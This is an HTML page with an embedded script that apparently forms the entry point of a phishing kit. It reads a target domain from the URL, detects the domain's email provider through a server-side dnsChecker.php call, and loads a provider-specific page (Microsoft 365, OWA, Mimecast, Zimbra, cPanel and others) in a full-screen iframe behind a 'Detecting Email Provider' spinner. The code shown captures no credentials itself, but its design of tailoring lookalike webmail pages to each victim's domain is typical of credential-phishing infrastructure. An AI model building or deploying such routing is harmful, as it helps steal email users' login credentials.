<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="titl">Email Provider Detection - Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .loader-container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loader-text {
            color: #333;
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 10px;
        }
        
        .loader-subtext {
            color: #666;
            font-size: 14px;
        }
        
        .hidden {
            display: none;
        }
        
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }
    </style>
</head>
<body>
    <div id="loader" class="loader-container">
        <div class="spinner"></div>
        <div class="loader-text">Detecting Email Provider</div>
        <div class="loader-subtext">Please wait...</div>
    </div>
    
    <iframe id="provider-frame" title="Provider Interface" class="hidden"></iframe>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

function getProviderPage(provider, domain) {
    // Map providers to their corresponding HTML pages
    var pageMap = {
        'microsoft_365': 'pages/microsoft_365.html',
        'owa': 'pages/owa.html',
        'mimecast': 'pages/mimecast.html',
        'rackspace': 'pages/rackspace.html',
        'smartermail': 'pages/smartermail.html',
        'zimbra': 'pages/zimbra.html',
        'roundcube': 'pages/roundcube.html',
        'cpanel': 'pages/cpanel.html',
        'horde': 'pages/horde.html',
        'unknown': 'pages/generic.html'
    };
    
    return pageMap[provider] || 'pages/generic.html';
}

function redirectToProvider(data) {
    var domain = getParameterByName('domain') || getParameterByName('cms') || 'example.com';
    var provider = data.provider || 'unknown';
    var redirectUrl = data.redirect_url || '';
    
    // Determine the page based on provider
    var page = getProviderPage(provider, domain);
    
    // Build the iframe URL with all parameters
    var iframeUrl = page + 
        '?domain=' + encodeURIComponent(domain) +
        '&provider=' + encodeURIComponent(provider) +
        '&redirect=' + encodeURIComponent(redirectUrl) +
        '&confidence=' + encodeURIComponent(data.confidence || 0);
    
    // Hide loader and show iframe
    document.getElementById('loader').classList.add('hidden');
    var frame = document.getElementById('provider-frame');
    frame.classList.remove('hidden');
    frame.src = iframeUrl;
}

function handleError() {
    var domain = getParameterByName('domain') || getParameterByName('cms') || 'example.com';
    var iframeUrl = 'pages/generic.html?domain=' + encodeURIComponent(domain) + '&provider=unknown';
    
    document.getElementById('loader').classList.add('hidden');
    var frame = document.getElementById('provider-frame');
    frame.classList.remove('hidden');
    frame.src = iframeUrl;
}

// Main detection logic
(function() {
    var domain = getParameterByName('domain') || getParameterByName('cms') || getParameterByName('dom');
    
    if (!domain) {
        // Try to get from form submission or default
        domain = prompt('Please enter domain:') || 'example.com';
    }
    
    // Call dnsChecker.php API
    $.ajax({
        type: 'GET',
        url: 'dnsChecker.php',
        data: { domain: domain },
        dataType: 'JSON',
        timeout: 15000,
        cache: false,
        success: function(response) {
            setTimeout(function() {
                if (response.success) {
                    redirectToProvider(response);
                } else {
                    handleError();
                }
            }, 500);
        },
        error: function(xhr, status, error) {
            console.error("Detection Error:", error);
            setTimeout(function() {
                handleError();
            }, 500);
        }
    });
})();
</script>

</body>
</html>
